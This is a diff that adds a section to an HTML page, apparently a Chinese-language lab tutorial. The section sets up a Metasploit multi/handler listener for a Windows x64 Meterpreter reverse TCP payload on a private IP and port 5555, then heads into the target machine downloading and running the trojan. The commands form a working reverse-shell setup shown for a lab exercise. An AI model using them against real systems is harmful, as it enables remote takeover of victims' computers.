@@ -12,6 +12,30 @@
 <div id="head">
 </div>
 <div id="content">
+    <div id="enableListening">
+        <p>开启监听等待靶机上线</p>
+        <pre>
+            <code class="language-shell">
+                <script type="text/plain" class="language-markup">
+    use exploit/multi/handler
+    #调用模块
+
+    set payload windows/x64/meterpreter/reverse_tcp
+    # 设定载荷
+
+    set lhost 192.168.165.236
+    # 设定ip
+
+    set lport 5555
+    # 设定端口
+
+    exploit
+    # 启动监听,等待靶机上线
+                </script>
+            </code>
+        </pre>
+        <h3>靶机下载木马文件并启动</h3>
+    </div>
 </div>
 <div id="end">
 </div>
